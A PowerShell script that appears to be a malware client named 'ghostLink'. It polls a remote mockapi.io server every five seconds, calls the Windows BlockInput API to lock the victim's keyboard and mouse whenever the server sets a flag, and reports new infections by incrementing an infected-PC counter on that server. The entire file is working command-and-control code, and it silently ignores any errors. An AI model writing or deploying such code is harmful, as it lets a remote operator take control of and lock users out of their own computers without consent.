$global:blockUserInput = $null
$global:nbPcInfect = 0
$global:nbPcInfectIncr = $null
$global:lastNbPcInfectIncr = ""

function checkDataBase {
    try {
        $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/" -Method Get -TimeoutSec 5

        if ($response -ne $null) {
            $global:blockUserInput = $response.blockUserInput
            $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
            $global:nbPcInfectIncr = $response.nbPcInfect.nbPcInfectIncr
        } else {
            $global:blockUserInput = $null
            $global:nbPcInfect = 0
            $global:nbPcInfectIncr = $null
        }
    } catch {
        $global:blockUserInput = $null
        $global:nbPcInfect = 0
        $global:nbPcInfectIncr = $null
    }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class BlockInputHelper {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@

function Block-UserInput {
    [BlockInputHelper]::BlockInput($true) | Out-Null
}

function Unblock-UserInput {
    [BlockInputHelper]::BlockInput($false) | Out-Null
}

function main {
    checkDataBase
    $global:lastNbPcInfectIncr = $global:nbPcInfectIncr

    while ($true) {
        checkDataBase

        if ($global:blockUserInput -eq $true) {
            Block-UserInput
        } else {
            Unblock-UserInput
        }

        if ($global:nbPcInfectIncr -ne $global:lastNbPcInfectIncr) {
            $updatedNbPcInfect = $global:nbPcInfect + 1

            $body = @{
                nbPcInfect = @{
                    nbPcInfect = $updatedNbPcInfect
                    nbPcInfectIncr = $global:nbPcInfectIncr
                }
            } | ConvertTo-Json

            $headers = @{ "Content-Type" = "application/json" }

            try {
                Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/1" `
                                  -Method Put `
                                  -Body $body `
                                  -Headers $headers
                $global:lastNbPcInfectIncr = $global:nbPcInfectIncr
            } catch {
                # Ignorer l'erreur ou logger si besoin
            }
        }

        Start-Sleep -Seconds 5
    }
}

main
